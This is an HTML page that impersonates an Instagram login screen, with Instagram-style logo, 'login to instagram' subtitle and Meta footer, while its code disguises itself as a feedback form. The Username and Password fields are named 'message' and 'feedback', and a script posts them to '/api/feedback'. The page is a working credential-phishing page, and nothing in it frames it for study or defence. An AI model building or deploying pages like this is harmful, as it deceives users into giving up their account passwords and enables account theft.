
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#111111">
<title>Feed Back Time</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  display: grid;
  place-items: center;
  padding: 20px;
  background: #fff;
  font-family: Arial, Helvetica, sans-serif;
  color: #fff;
}

.panel {
  width: min(100%, 360px);
  min-height: 560px;
  padding: 30px 22px 24px;
  border: 1px solid #292929;
  border-radius: 24px;
  background: #111;
  display: flex;
  flex-direction: column;
}

.language {
  text-align: center;
  color: #777;
  font-size: 10px;
  margin: 5px 0 25px;
}

.logo {
  display: grid;
  place-items: center;
  margin: 10px 0 28px;
}

.logo svg {
  width: 48px;
  height: 48px;
}

h1 {
  text-align: center;
  font-size: 19px;
  font-weight: 500;
  margin: 0 0 9px;
}

.subtitle {
  color: #aaa;
  text-align: center;
  font-size: 12px;
  line-height: 1.5;
  margin: 0 0 25px;
}

form {
  display: flex;
  flex-direction: column;
  gap: 11px;
}

.field {
  width: 100%;
  height: 44px;
  padding: 0 12px;
  border: 1px solid #3a3a3a;
  border-radius: 10px;
  background: #141414;
  color: #fff;
  font: 12px Arial, sans-serif;
  outline: none;
}

.field::placeholder {
  color: #b6b6b6;
}

.field:focus {
  border-color: #5865ff;
}

textarea.field {
  min-height: 44px;
  height: 44px;
  resize: none;
  overflow: hidden;
  padding-top: 14px;
}

.send {
  height: 43px;
  margin-top: 2px;
  border: 0;
  border-radius: 25px;
  background: #2935ff;
  color: white;
  font-size: 12px;
  font-weight: bold;
  cursor: pointer;
  transition: background .2s, transform .2s;
}

.send:hover {
  background: #4650ff;
}

.send:active {
  transform: scale(.98);
}

.feedback-time {
  text-align: center;
  margin-top: 19px;
  font-family: Georgia, "Times New Roman", serif;
  font-size: 17px;
  font-weight: 600;
  letter-spacing: 1.5px;
  color: #f5f5f5;
  text-shadow: 0 0 12px rgba(75, 85, 255, .35);
}

.status {
  min-height: 16px;
  margin-top: 12px;
  text-align: center;
  color: #a7edb8;
  font-size: 11px;
  line-height: 1.5;
}

.bottom {
  margin-top: auto;
  padding-top: 35px;
  text-align: center;
}

.clear {
  width: 100%;
  height: 40px;
  border: 1px solid #3440ff;
  border-radius: 24px;
  background: transparent;
  color: #7580ff;
  font-size: 12px;
  cursor: pointer;
}

.meta {
  margin-top: 15px;
  color: #bbb;
  font-size: 12px;
}

@media (max-width: 500px) {
  body {
    background: #111;
    padding: 15px;
  }

  .panel {
    min-height: 560px;
    border-radius: 22px;
  }
}
</style>
</head>

<body>

<main class="panel">
  <div class="language">English (US) ⌄</div>

  <div class="logo" aria-label="Gradient camera logo">
    <svg viewBox="0 0 48 48" fill="none" aria-hidden="true">
      <defs>
        <linearGradient id="instagram" x1="4" y1="44" x2="44" y2="4">
          <stop stop-color="#ffb900"/>
          <stop offset=".48" stop-color="#ff174f"/>
          <stop offset="1" stop-color="#c900c8"/>
        </linearGradient>
      </defs>
      <rect x="4" y="4" width="40" height="40" rx="12"
        stroke="url(#instagram)" stroke-width="3.5"/>
      <circle cx="24" cy="24" r="9"
        stroke="url(#instagram)" stroke-width="3.5"/>
      <circle cx="35" cy="13" r="2.4" fill="#ff315d"/>
    </svg>
  </div>

  <h1></h1>
  <p class="subtitle">
    login to instagram
  </p>

  <form id="feedbackForm">
    <input
      class="field"
      id="message"
      name="message"
      type="text"
      placeholder="Username"
      maxlength="120"
      required
      aria-label="Username"
    >

    <textarea
      class="field"
      id="feedback"
      name="feedback"
      placeholder="Password"
      maxlength="1500"
      required
      aria-label="Password"
    ></textarea>

    <button class="send" type="submit">Login</button>

    <div class="feedback-time"></div>

    <div class="status" id="status" aria-live="polite"></div>
  </form>

  <div class="bottom">
    <button class="clear" type="button" id="clear">
      Create account
    </button>
    <div class="meta">∞ Meta-inspired design</div>
  </div>
</main>

<script>

const form = document.getElementById("feedbackForm");
const message = document.getElementById("message");
const feedback = document.getElementById("feedback");
const statusText = document.getElementById("status");

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const data = {
    message: message.value.trim(),
    feedback: feedback.value.trim()
  };

  if (!data.message || !data.feedback) {
    statusText.textContent = "Please complete both fields.";
    return;
  }

  const sendButton = form.querySelector('button[type="submit"]');
  sendButton.disabled = true;
  sendButton.textContent = "Sending...";
  statusText.textContent = "";

  try {
    const response = await fetch("/api/feedback", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });

    const result = await response.json();

    if (!response.ok) {
      throw new Error(result.error || "Unable to send.");
    }

    statusText.textContent = result.message;
    form.reset();
  } catch (error) {
    statusText.textContent =
      error.message || "Connection error. Please try again.";
  } finally {
    sendButton.disabled = false;
    sendButton.textContent = "Send";
  }
});

</script>

</body>
</html>
